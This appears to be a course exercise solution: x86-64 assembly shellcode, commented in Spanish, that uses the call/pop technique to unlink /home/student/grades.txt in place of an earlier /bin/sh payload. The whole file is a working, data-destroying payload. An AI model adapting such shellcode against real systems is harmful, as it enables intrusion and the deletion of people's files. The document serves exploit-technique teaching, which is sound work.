#include <sys/syscall.h>

/* Shellcode que invoca unlink("/home/student/grades.txt")
 * Ejercicio 3: reemplaza el execve("/bin/sh") original.
 *
 * Técnica call/pop para obtener la dirección del string sin usar
 * posiciones absolutas (position-independent shellcode).
 */

#define STRING  "/home/student/grades.txt"
#define STRLEN  24          /* longitud del string sin null terminator */

.globl main
.type main, @function

main:
    jmp calladdr            /* saltamos al call para obtener la dir del string */

popladdr:
    popq    %rcx            /* %rcx = dirección del inicio del string */

    xorq    %rax, %rax      /* rax = 0 */
    movb    %al, STRLEN(%rcx)   /* null-terminar el string en rcx[24] */

    movb    $SYS_unlink, %al    /* número de syscall: unlink = 87 */
    movq    %rcx, %rdi          /* arg1 = puntero al pathname */
    syscall                     /* unlink("/home/student/grades.txt") */

    /* exit limpio */
    xorq    %rax, %rax
    movb    $SYS_exit, %al      /* syscall exit = 60 */
    xorq    %rdi, %rdi          /* exit code 0 */
    syscall

calladdr:
    call    popladdr            /* push addr del siguiente byte en stack, luego salta */
    .ascii  STRING              /* el string vive aquí; popladdr hace pop de esta dirección */
